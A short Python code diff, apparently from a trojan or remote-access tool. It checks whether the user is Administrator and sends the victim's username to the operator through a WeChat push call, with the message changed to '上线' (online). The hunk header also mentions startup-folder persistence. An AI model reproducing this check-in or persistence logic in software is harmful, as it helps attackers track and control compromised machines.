@@ -111,5 +111,4 @@ def get_startup_folder_path():
 if sys_username == 'Administrator':
     # start_cmd('start cmd')
     ...
-wechat_push.Alleged_information(f'{sys_username}执行cod')
-
+wechat_push.Alleged_information(f'{sys_username}上线')
